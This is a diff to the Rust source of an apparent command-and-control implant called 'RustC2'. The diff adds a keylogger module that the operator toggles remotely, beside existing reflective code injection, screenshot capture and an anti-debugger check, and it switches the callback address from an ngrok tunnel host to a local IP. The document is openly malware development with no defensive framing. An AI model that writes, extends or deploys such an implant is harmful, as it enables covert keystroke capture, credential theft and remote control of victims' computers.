@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 use clap::{arg, Command};
 use simple_crypt::{decrypt, encrypt};
 use std::{
@@ -14,6 +14,8 @@ use rand::rngs::OsRng;
 mod utils;
 mod sandbox;
 mod inject;
+#[cfg(windows)]
+mod keylogger;
 
 use utils::ImportedScript;
 
@@ -38,8 +40,8 @@ fn main() {
     #[cfg(windows)]
     sandbox::check_debugger();
 
-    let mut host = "0.tcp.in.ngrok.io".to_string();
-    let mut port = "17418".to_string();
+    let mut host = "192.168.183.1".to_string();
+    let mut port = "8080".to_string();
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
 
     let matches = Command::new("RustC2")
@@ -128,6 +130,18 @@ fn main() {
                         inject::reflective_inject(&mut stream, command, shared_secret);
                     } else if command_clone.starts_with("||SCREENSHOT||") {
                         utils::handle_screenshot();
+                    } else if command_clone.starts_with("||KEYLOGGER||") {
+                        #[cfg(windows)]
+                        let output = keylogger::keylogger(&mut stream, command, shared_secret);
+                        #[cfg(windows)]
+                        match output {
+                            Ok(_) => {
+                                println!("Toggled keylogger");
+                            }
+                            Err(e) => {
+                                println!("Error toggling keylogger: {}", e);
+                            }
+                        }
                     } else if command_clone.starts_with("||EXIT||") {
                         exit(1);
                     } else {
